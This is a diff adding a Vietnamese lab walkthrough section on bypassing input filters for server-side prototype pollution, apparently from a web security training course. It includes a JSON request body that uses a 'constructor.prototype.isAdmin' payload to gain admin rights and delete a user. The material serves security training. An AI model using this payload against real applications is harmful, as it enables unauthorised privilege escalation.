@@ -136,6 +136,27 @@ Nhận thấy, khi submit với tham số `country` không hợp lệ, response 
 Sau khi submit, kết quả trả về bình thường. Tiếp đó ta thử submit một response lỗi, nhận thấy status code là 599. Như vậy, ta detect được website có lỗi prototype pollution, bài lab được giải.
 
 # 8. Bypassing flawed input filters for server-side prototype pollution
+Đăng nhập với credentials wiener:peter, nhận thấy trong chức năng thay đổi address, response có reflect lại các tham số trong request. Ta thử exploit bằng cách thêm `"__proto__":{"isAdmin":true}` nhưng không thành công.
+
+Thử exploit bằng cách sử dụng constructor, ta cấu hình request với body như sau:
+```
+{
+    "address_line_1":"Wiener HQ",
+    "address_line_2":"One Wiener Way",
+    "city":"+AGYAbwBv-",
+    "postcode":"BU1 1RP",
+    "country":"UK",
+    "sessionId":"4PyZOkbzhI4s0yNatSRfJ4fMc2V0qHAV",
+    "constructor":
+    {
+        "prototype":
+        {
+            "isAdmin":true
+        }
+    }
+}
+```
+Sau khi submit, ta thấy response trả về `"isAdmin": true`. Như vậy, refresh browser và truy cập "Admin panel" để xóa user carlos. Bài lab được giải.
 
 # 9. Remote code execution via server-side prototype pollution
 
